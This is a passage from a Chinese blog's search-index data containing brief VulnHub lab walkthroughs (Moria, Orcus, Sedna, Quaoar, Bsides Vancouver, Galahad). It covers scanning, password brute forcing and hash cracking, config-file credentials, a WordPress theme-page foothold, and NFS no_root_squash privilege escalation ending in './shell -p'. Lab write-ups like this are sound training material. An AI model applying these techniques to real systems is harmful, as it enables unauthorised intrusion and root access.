id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e21端口\u003c/p\u003e\n\u003cp\u003e没有匿名登录，但是好像有用户名提示\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEbe35638162f0c84f995eb0b88335b584image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e80端口\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE6bfd8cad1a1e44e51e99de3184ad4c0eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf42024073e9017b2269167ae04e3eaa9image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e什么意思呢：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd6b8e169b957283965b6df36f9826fd1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e收集一下目前的单词：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE09e358376ca873d91f00339ce2f9eceeimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e可能用到账户号密码的地方：ftp\\ssh\\首页图片，那就挨个试了吧\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE74ded5f2a963ebce62001c53fe911babimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEdd14bc3a9f58394795c65487b3fa40baimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现还是不对，线索断了，搜了一下，发现这个靶机相当有意思\u003c/p\u003e\n\u003cp\u003e没想到，这个页面是随机的，刷新后就不一样了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE38e9387b3accccc4cdcf115e22207bd9image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e对这个目录再次爆破：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE173673037a134a2f3426539a6d654f4cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是看这段对话还是一头雾水：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4c96b7f77d0612b3416b5d8423f21d43image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后看wp，我是真的没想到这里面能藏信息的，注意看本机发给靶机的几个包：\u003c/p\u003e\n\u003cp\u003e按顺序为：77，101，108，108，111，110，54，57\u003c/p\u003e\n\u003cp\u003eascii码对应为：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf371fe4b288f2d5fc3af1e4301ce02e9image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这是ftp的密码：\u003c/p\u003e\n\u003cp\u003e虽然没有写入权限，但是有线索：\u003c/p\u003e\n\u003cp\u003eQlVraKW4fbIkXau9zkAPNGzviT3UKntl\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE38551cb5a4ad272ceea65021ad5fff7cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e访问：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe327071b007faf520cce5645a85d9dbfimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEeb12e472507b9dadaba29cb1df575c5cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e加盐的MD5破解：\u003c/p\u003e\n\u003cp\u003e这里我其实是没找到hashcat的破解格式的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9740b10664c6d3d7e62a15013b762e06image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e后面又查了一些资料：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE10f1e4e395d7e67cdd63c66747a4c01eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9e0a2b090648b3e398a203c56743040aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEaa15cbedaa5c45788606113d41edc59cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e稍微处理了一下：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE31fde46dd5dcb40d19ac7a079405bb39image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ehydra爆破有拒绝，用\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7509ca6d065293626fc1062738f8adffimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x057 Moria 1.1 "},{"content":"\r渗透测试 看样子是开了samba先看看吧，无果：\n80端口看看：\n发现已知CMS\n但是很可惜，已知漏洞利用失败了：\n_0c7aa37c1e5b7386c5d18dba80bb5d3b^118e4111302d35936b445390f58fb9f006cda2dd_0.file._maintenance.tpl.php\n疑似线索：\n发现密码：\nDEFINE (\u0026lsquo;DB_USER\u0026rsquo;, \u0026lsquo;dbuser\u0026rsquo;);\nDEFINE (\u0026lsquo;DB_PASSWORD\u0026rsquo;, \u0026lsquo;dbpassword\u0026rsquo;);\nDEFINE (\u0026lsquo;DB_HOST\u0026rsquo;, \u0026rsquo;localhost\u0026rsquo;);\nDEFINE (\u0026lsquo;DB_NAME\u0026rsquo;, \u0026lsquo;quizdb\u0026rsquo;);\n有绝对路径，但是没权限：\n通过数据库发现路径：\n需要设置一下，然后就可以进去了：\n提权 内核：\nNFS\n当服务器中存在NFS共享，且开启了no_root_squash选项时，这时如果客户端使用的是root用户，那么对于共享目录来说，该客户端就有root权限，可以使用它来提升权限。\n挂载\n复制bash\n给权限：\n./shell -p\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x058-orcus/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd025b8ab10aa135fb9a5859ce8df8e5dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE59e59a940a7e0c8e7ff3ca81de317ddfimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7fc4ba468d7681ab6f38eee1a3727eccimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc785c237ce995475c7e5e7101df3a286image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEbc2e5ee2c6a7e5ab47d0f2191d0eb393image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe345087502a5935e1152a8156c3a042eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透测试\"\u003e渗透测试\u003c/h1\u003e\n\u003cp\u003e看样子是开了samba先看看吧，无果：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9cdfe965b0f6ffc62ffdc133e9f570f5image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e80端口看看：\u003c/p\u003e\n\u003cp\u003e发现已知CMS\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEfccb4e29c60fcffa14ecb277083999a0image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是很可惜，已知漏洞利用失败了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE91ecc5c1ef60885fcd4b0dbaea5c1019image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e_0c7aa37c1e5b7386c5d18dba80bb5d3b^118e4111302d35936b445390f58fb9f006cda2dd_0.file._maintenance.tpl.php\u003c/p\u003e\n\u003cp\u003e疑似线索：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8a82638c40e6a3857f20eb25cfa77755image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现密码：\u003c/p\u003e\n\u003cp\u003eDEFINE (\u0026lsquo;DB_USER\u0026rsquo;, \u0026lsquo;dbuser\u0026rsquo;);\u003c/p\u003e\n\u003cp\u003eDEFINE (\u0026lsquo;DB_PASSWORD\u0026rsquo;, \u0026lsquo;dbpassword\u0026rsquo;);\u003c/p\u003e\n\u003cp\u003eDEFINE (\u0026lsquo;DB_HOST\u0026rsquo;, \u0026rsquo;localhost\u0026rsquo;);\u003c/p\u003e\n\u003cp\u003eDEFINE (\u0026lsquo;DB_NAME\u0026rsquo;, \u0026lsquo;quizdb\u0026rsquo;);\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe54065478db499e28f7bd7891e058162image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7ec53e00aaba62f4b36d897bea408a50image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e有绝对路径，但是没权限：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd40b7ebd91012cdb5eac78cd21844b31image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e通过数据库发现路径：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEefd585cd4ab8bcc0325a21678b70ddbdimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e需要设置一下，然后就可以进去了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEda8c1bc7549f245c7e01a8d0f1b3b48bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa0df844bcce0229871917de1f531834dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc8fd6a2c42c0fe727f24488d8e1a9122image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e内核：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc6c2b024081b8267206f416fd7f998abimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eNFS\u003c/p\u003e\n\u003cp\u003e当服务器中存在NFS共享，且开启了no_root_squash选项时，这时如果客户端使用的是root用户，那么对于共享目录来说，该客户端就有root权限，可以使用它来提升权限。\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa3ae3bcea285120de225ba2e8e6d24d1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1f2644616e804e3b8c187f83404230f4image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8531d9dd5547cc90b149c72f0d05db8eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e挂载\u003c/p\u003e","title":"0x058 Orcus"},{"content":"端口扫描 渗透 先看samb吧：\n80端口\n疑似线索：\ntests/_data/dump.sql\n恼火，没想到，中间件漏洞，没见过的：\n修改poc:\n提权 试了无数的POC\n最后无奈找到这个了：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x059-sedna/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc135975b771204af23cdab25abe64e82image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEaa778fd28e434b1b3b9adbe24cb85a9eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e先看samb吧：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5e29a48c49bd12b7b99e6fc9671af808image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e80端口\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE45c8ad22204e88076863d1d3f486853cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e疑似线索：\u003c/p\u003e\n\u003cp\u003etests/_data/dump.sql\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE18da2beffdffc3acbddc3bafd1ca247fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e恼火，没想到，中间件漏洞，没见过的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4b888a8cfc792dfd5a560b414e0dd46aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE718aab8b67187e563187c6e28f306b39image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e修改poc:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE366be6ed4caac38271c4a58bccf02ff1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4811b1e61ed5b39aafab3687c248ca06image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa815e56eee76a861fd14af9504f6a870image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e试了无数的POC\u003c/p\u003e\n\u003cp\u003e最后无奈找到这个了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE6c2f26be610b59cf38575fc60d7cbb49image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1bf036cedb6d1e303899d2f797ccaf45image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5cf27c92f92e4873419c8366bf2f80aeimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE6161a6e5f75e884bce7fc4c7aec612adimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE477bbe6399bbfe714432f7946efb8842image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x059 Sedna"},{"content":"端口扫描 渗透 Samba\n80端口\nwpscan\n插件\n用户：\nhttp://192.168.5.107/wordpress/wp-content/themes/twentyfourteen/404.php\n提权 ","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x060-quaoar/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE472b2c69ca019350f88d4ab45af2f53eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEef21bc446a2a2b84cd76b9d685f3a045image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEda947d05f05a47cea653084f2f94ac2bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE85c3e28dbc5d3930cae976f1bca81e6aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE945b214fb3b9f43d88b3ff96b233fefaimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003eSamba\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEedfa0689cd4b8bee27a8c45792f5ad0cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e80端口\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5897df7b6c73a0ad82210e3e43d31d59image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ewpscan\u003c/p\u003e\n\u003cp\u003e插件\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd47c48cef34f04d248fa596a0327921eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e用户：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEfaf916a235e10af75fd774a5b15236d3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE373abc3f91ee9bcf642a666157e98bcaimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"http://192.168.5.107/wordpress/wp-content/themes/twentyfourteen/404.php\"\u003ehttp://192.168.5.107/wordpress/wp-content/themes/twentyfourteen/404.php\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd62726fcda258afbd659cdbffd7c8c57image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4f017cc3c18226c633d00b8023ff44b4image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE68d96189d3f6478ee753fda28e3d7e90image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x060 Quaoar"},{"content":"端口扫描 渗透 21匿名登录：\n用户名：\nftp切换失败：\n80端口\n目录扫描\n发现wordpress\nwpscan\n用户\n插件\n试了一下刚刚的文件：\n不行\n上rockyou\n提权 sudo -l没有密码\nSUID发现可疑文件：\n但是似乎用不了：\n发现五个用户：\n和ftp里面的一样\n数据库信息：\n但是这个密码所有用户都用不了\n上脚本:\n计划任务：\n内核提权：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x061-bsides-vancouver-2018/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd4a208d5ba6cdb952ee2bedc82c80b5bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE939d567f974e37d69e6998aaf8980c32image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE30bd3b6720afb4a6c2397fb4013ed596image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e21匿名登录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5fc4d760efb2900c10a83966e3c8fb12image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e用户名：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE98c80455ce49bcda563fcde343d435afimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eftp切换失败：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE3d34aa3f26a3a2ce913f086334c567bdimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e80端口\u003c/p\u003e\n\u003cp\u003e目录扫描\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEfaa345832def0cdf643ea5cd033fd356image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现wordpress\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7174001dca5312c001b2bf8248f466a0image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ewpscan\u003c/p\u003e\n\u003cp\u003e用户\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE96ed499c674f2558315d7e380e87b1baimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e插件\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf2bf6ba3cc367d65b39a9209567e00baimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e试了一下刚刚的文件：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8cfab4f813095664bca44462cce0f930image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e不行\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE3e7b3acad6161d06b02b32c0e84d4c87image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e上rockyou\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEcd4dfdfb8aa8fa5b6669fc8bd717b9e9image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE53fcf80257d3245a8ac84fa438576486image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003esudo -l没有密码\u003c/p\u003e\n\u003cp\u003eSUID发现可疑文件：\u003c/p\u003e\n\u003cp\u003e但是似乎用不了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEce4824daee28ea08c183383d1a83a660image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现五个用户：\u003c/p\u003e\n\u003cp\u003e和ftp里面的一样\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9d06815302c181ea6a67dfc46c1b5c07image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e数据库信息：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE221591cc45b9c5410b305b810f592080image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是这个密码所有用户都用不了\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8a641193b29534192d4d91588b6002d7image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e上脚本:\u003c/p\u003e\n\u003cp\u003e计划任务：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE954743f866eace0c6b2e697dcaf46381image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc84f4adb368542c99c32d97b6566f56bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE675bcdef1b815f9b99edf390413cc2ddimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5f9faf406223032eed55a89fd9afd0f9image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e内核提权：\u003c/p\u003e","title":"0x061 Bsides Vancouver 2018"},{"content":"端口扫描 渗透测试 80端口\n打开网页，发现一串二进制字符：\n解开后是这一串内容：\n发现s.txt:\n解密出来：\n后面没思路了，我还是不太喜欢这种CTF式的靶机，我满脑子只想着拿shell，所以，在查阅大量资料后，我只尝试进行拿到root：\n经过一段骚操作：\nssh账号nitro\n密码：zeus\n巨邪门儿，不喜欢ctf:\n井字棋先手，然后无脑下四角就能赢：\n提权 疑似计划任务：\n先秒了再说\n再来回头看这个计划任务，整个目录都有写入权限：\n不过这个15分钟确实缺德：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x062-defcon-toronto-galahad/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe605071498edbb1bc00d96ed7a95b46bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE6cab4bd04da57ff2b2998519d55bc3f6image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEfed7689ccc7ddf553473c9dfc7c8b60cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透测试\"\u003e渗透测试\u003c/h1\u003e\n\u003cp\u003e80端口\u003c/p\u003e\n\u003cp\u003e打开网页，发现一串二进制字符：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9aac4a6b445e87397df8a1ca5045bf48image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e解开后是这一串内容：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf9badb0256196b71484da9aba2948844image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE902c72824e62e7f84c1a922e0a7cae4cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现s.txt:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc9308d55abbf6717142358fcaf9e0438image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e解密出来：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEda20193037a7fb2ac537179ffcf289c4image.png\" alt=\"\"  